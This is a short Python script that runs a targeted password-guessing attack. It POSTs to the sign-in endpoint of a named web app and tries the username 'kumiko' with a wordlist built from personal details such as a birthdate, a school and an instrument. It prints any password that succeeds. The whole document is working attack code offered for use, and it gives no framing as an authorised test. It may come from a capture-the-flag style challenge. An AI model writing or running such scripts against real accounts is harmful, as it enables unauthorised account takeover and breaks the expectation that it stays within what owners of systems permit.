import urllib.request, json, urllib.error
username = "kumiko"
passwords = [
    "euphonium","Euphonium","kitauji","Kitauji","KitaujiHighSchool","kitaujihighschool",
    "15042000","15April2000","april152000","kumiko2000","Kumiko2000","kumiko15042000",
    "euphoniumlover","aria","ariaeuphonium","soundeuphonium","hibike","hibikeeuphonium"
]
url = "https://euphonium-fgte.vercel.app/api/signin"
headers = {"Content-Type":"application/json"}
for pwd in passwords:
    data = json.dumps({"username": username, "password": pwd}).encode()
    req = urllib.request.Request(url, data=data, method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
            print("SUCCESS", pwd, body)
            break
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        if e.code != 401:
            print("Unexpected", pwd, e.code, body)
        else:
            print("fail", pwd)
else:
    print("No password matched")
